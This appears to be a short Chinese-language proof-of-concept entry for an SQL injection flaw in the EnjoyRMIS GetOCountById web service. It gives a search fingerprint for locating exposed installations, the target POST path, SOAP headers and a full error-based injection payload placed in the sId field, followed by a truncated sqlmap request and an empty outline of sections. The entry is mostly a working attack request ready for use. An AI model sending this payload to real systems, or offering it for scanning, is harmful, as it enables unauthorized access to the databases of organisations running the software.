# EnjoyRMISGetOCountById存在SQL注入漏洞

- **系统**：EnjoyRMISGetOCountById　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`web.body="CheckSilverlightInstalled"`
- **请求**：`POST /EnjoyRMIS_WS/WS/POS/cwsoa.asmx HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Type: text/xml; charset=utf-8`　`Content-Length: length`　`SOAPAction: "http://tempuri.org/GetOCountById"`

**请求体 / payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetOCountById xmlns="http://tempuri.org/">
<sId>string' AND 8494 IN (SELECT (CHAR(113)+CHAR(107)+CHAR(113)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (8494=8494) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(107)+CHAR(107)+CHAR(113))) AND 'PDAF'='PDAF</sId>
</GetOCountById>
</soap:Body>
</soap:Envelope>

sqlmap
POST /EnjoyRMIS_WS/WS/POS/cwsoa.asmx HTTP/1.1
Host: xx.…（脚本共 1046 字，完整版见原文）
```

**其他**
- EnjoyRMIS GetOCountById存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * EnjoyRMIS